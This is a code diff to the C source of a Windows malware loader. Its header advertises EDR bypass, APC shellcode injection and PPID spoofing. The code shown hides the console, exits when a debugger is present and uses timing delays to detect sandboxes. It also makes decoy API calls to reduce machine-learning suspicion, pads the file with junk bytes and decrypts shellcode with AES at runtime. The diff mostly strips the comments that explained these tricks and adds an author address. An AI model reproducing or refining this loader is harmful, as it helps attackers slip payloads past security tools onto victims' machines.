@@ -6,6 +6,7 @@
  * ██╔╝ ██╗ ╚████╔╝ ██╔╝ ██╗    ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║  ██║
  * ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
  *
+ * Author : 28Zaakypro@proton.me
  * Multi-stage Windows loader with evasion and EDR bypass capabilities.
  * Executes shellcode via APC injection with PPID spoofing.
  */
@@ -47,19 +48,15 @@ static LOADER_CONFIG g_config;
 void SetupEnvironment(void)
 {
 #ifdef PRODUCTION
-    // Hide console window in production mode
     FreeConsole();
 #endif
-
-    // Add legitimate-looking imports to dilute suspicious API patterns
-    // These calls are benign and increase the "legitimate API" ratio
+    
     (void)GetModuleHandleA("kernel32.dll");
     (void)GetVersion();
     (void)GetCurrentProcessId();
     (void)GetCurrentThreadId();
 }
 
-// Sleeps for specified seconds and checks if time actually passed (sandbox detection)
 BOOL AntiSandboxDelay(DWORD seconds)
 {
     LARGE_INTEGER frequency, startTime, endTime;
@@ -74,7 +71,6 @@ BOOL AntiSandboxDelay(DWORD seconds)
     DWORD expectedMs = seconds * 1000;
     DWORD minAcceptableMs = (DWORD)(expectedMs * 0.90);
 
-    // If time was skipped, we're probably in a sandbox
     if (elapsedMs < minAcceptableMs)
     {
         return FALSE;
@@ -89,24 +85,17 @@ static void PerformLegitimateFileOperations(void)
     CHAR tempPath[MAX_PATH];
     CHAR tempFile[MAX_PATH];
 
-    // Get temp directory (legitimate API)
     GetTempPathA(MAX_PATH, tempPath);
-
-    // Create a temp filename (legitimate API)
     GetTempFileNameA(tempPath, "CFG", 0, tempFile);
-
-    // Check if file exists (legitimate API)
+    
     DWORD attrs = GetFileAttributesA(tempFile);
     if (attrs != INVALID_FILE_ATTRIBUTES)
     {
         DeleteFileA(tempFile);
     }
 
-    // Get system directory (legitimate API)
     CHAR sysDir[MAX_PATH];
     GetSystemDirectoryA(sysDir, MAX_PATH);
-
-    // Get Windows directory (legitimate API)
     CHAR winDir[MAX_PATH];
     GetWindowsDirectoryA(winDir, MAX_PATH);
 }
@@ -128,6 +117,7 @@ static BOOL ValidateConfiguration(LOADER_CONFIG *config)
         return FALSE;
     if (config->delaySeconds == 0)
         return FALSE;
+    
 // Allow higher threshold in debug mode (up to 200 for VM testing)
 #ifdef PRODUCTION
     if (config->suspicionThreshold > 100)
@@ -151,7 +141,6 @@ static void ProcessConfigurationData(void)
     DWORD result = CalculateChecksum(tempBuffer, sizeof(tempBuffer));
     if (result != 0)
     {
-        // Ensure this code isn't optimized away
         volatile DWORD dummy = result;
         (void)dummy;
     }
@@ -286,9 +275,9 @@ BOOL DecryptAndInject(void)
         0x32, 0x35, 0x00, 0x00, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20,
         0x31, 0x2E, 0x30, 0x2E, 0x30, 0x00, 0x00, 0x00, 0x50, 0x72, 0x6F, 0x64,
         0x75, 0x63, 0x74, 0x4E, 0x61, 0x6D, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00};
-    (void)junkPadding; // Prevent optimization
+    (void)junkPadding;
 
-    // AES-256-CBC decryption at runtime (much more secure than XOR)
+    // AES-256-CBC decryption at runtime
     BYTE *shellcode = NULL;
     DWORD shellcodeSize = 0;
 
@@ -348,7 +337,6 @@ int main()
 #endif
 
 #ifdef PRODUCTION
-    // Check for debugger (PRODUCTION ONLY)
     if (IsDebuggerPresent())
     {
         return EXIT_SUCCESS;
@@ -359,8 +347,6 @@ int main()
     printf("[*] Debugger check DISABLED for testing\n\n");
 #endif
 
-// Extended delay to bypass sandbox timeout (most sandboxes stop after 60-90s)
-// Also performs anti-acceleration checks
 #ifndef PRODUCTION
     printf("[*] Performing extended delay check (5s DEBUG MODE)...\n");
 #endif
@@ -370,7 +356,7 @@ int main()
     {
 #else
     if (!AntiSandboxDelay(5))
-    { // DEBUG: 5s instead of 120s
+    {
 #endif
 #ifndef PRODUCTION
         printf("[!] Time acceleration detected - exiting\n");
@@ -378,13 +364,11 @@ int main()
         return EXIT_SUCCESS;
     }
 
-// Wait to bypass automated sandboxes
 #ifndef PRODUCTION
     printf("[*] Second delay: %d seconds...\n", g_config.delaySeconds);
 #endif
     AntiSandboxDelay(g_config.delaySeconds);
 
-// Fake legitimate operations to reduce ML suspicion
 #ifndef PRODUCTION
     printf("[*] Performing fake legitimate operations...\n");
 #endif
